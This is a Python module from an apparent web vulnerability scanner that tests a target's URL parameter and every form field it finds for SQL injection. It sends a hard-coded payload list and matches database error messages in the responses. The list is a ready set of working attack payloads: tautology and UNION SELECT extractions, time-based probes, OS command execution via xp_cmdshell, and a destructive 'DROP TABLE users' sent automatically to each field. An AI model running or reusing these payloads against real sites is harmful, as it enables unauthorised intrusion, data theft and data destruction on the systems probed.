# Détection des injections SQL
import requests
import urllib3
from core.utils import find_forms
from core.config import create_session, DEFAULT_TIMEOUT

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SQLI_PAYLOADS = [
    "'", "' OR '1'='1", "' OR '1'='1' --", '" OR "1"="1', "' OR 1=1--", '" OR 1=1--',
    "' OR 1=1#", "' OR 1=1/*", "' UNION SELECT null, version()--", "' UNION SELECT null, database()--",
    "/*!50000 UNION SELECT null, version()*/", "' UNION SELECT null, user()--",
    "' UNION SELECT null, table_name FROM information_schema.tables--",
    "1' OR '1'='1' --", "1' OR '1'='1' #",
    "' AND 1=CAST((SELECT @@version) AS INT)--", "' OR SLEEP(5)--",
    "'; EXEC xp_cmdshell('whoami')--", "'; DROP TABLE users--",
    "' AND 1=1--", "' AND 1=2--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' UNION SELECT null, concat(user(),0x3a,version())--",
    "admin'--", "admin' #", "' OR ''='",
]

SQLI_SIGNATURES = [
    "You have an error in your SQL syntax",
    "Warning: mysql_fetch",
    "Unclosed quotation mark",
    "Microsoft OLE DB Provider",
    "SQLSTATE[",
    "ODBC SQL Server Driver",
    "Syntax error in string",
    "Unknown column",
    "Fatal error",
    "MySQL server version",
    "PostgreSQL query failed",
    "syntax error",
    "mysql_fetch",
    "database error",
    "unterminated string",
    "pg_query",
    "ORA-01756",
    "SQLite3::query",
    "sqlite_query",
    "PDOException",
]


def scan_sqli(target, formated_target, timeout=DEFAULT_TIMEOUT):
    """Teste l'injection SQL (SQLi)."""
    print(f"\n\t==============Scan SQLI sur -->{formated_target}<-- 🔍 ==============\n")

    vuln_found = False
    sqli_results = {}
    session = create_session()

    # Test URL-based injection
    for payload in SQLI_PAYLOADS:
        test_url = f"{target}?input={payload}"
        try:
            response = session.get(test_url, timeout=timeout)
            response_text = response.text.lower()

            if any(signature.lower() in response_text for signature in SQLI_SIGNATURES):
                print(f"[!!!] SQLi détectée dans l'URL : {test_url}")
                vuln_found = True
                sqli_results[test_url] = "VULNERABLE (URL Injection)"

        except requests.exceptions.RequestException as e:
            print(f"[!] Erreur lors de la requête URL SQLi : {e}")

    # Test form-based injection
    forms = find_forms(target, timeout=timeout)

    if forms:
        for form in forms:
            action = form.get("action")
            method = form.get("method", "get")
            inputs = form.get("inputs", [])

            target_url = target + action if action else target

            for input_field in inputs:
                field_name = input_field.get("name")
                if not field_name:
                    continue

                for payload in SQLI_PAYLOADS:
                    form_data = {field_name: payload}

                    try:
                        if method == "post":
                            response = session.post(target_url, data=form_data, timeout=timeout)
                        else:
                            response = session.get(target_url, params=form_data, timeout=timeout)

                        response_text = response.text.lower()

                        if any(signature.lower() in response_text for signature in SQLI_SIGNATURES):
                            print(f"[!!!] SQLi détectée dans le formulaire `{field_name}` avec : {payload}")
                            vuln_found = True
                            sqli_results[target_url] = f"VULNERABLE - Champ {field_name}"

                    except requests.exceptions.RequestException as e:
                        print(f"[!] Erreur lors de la requête formulaire SQLi : {e}")

    if not vuln_found:
        print("\n✅  Aucun SQLi détecté.\n")

    return sqli_results
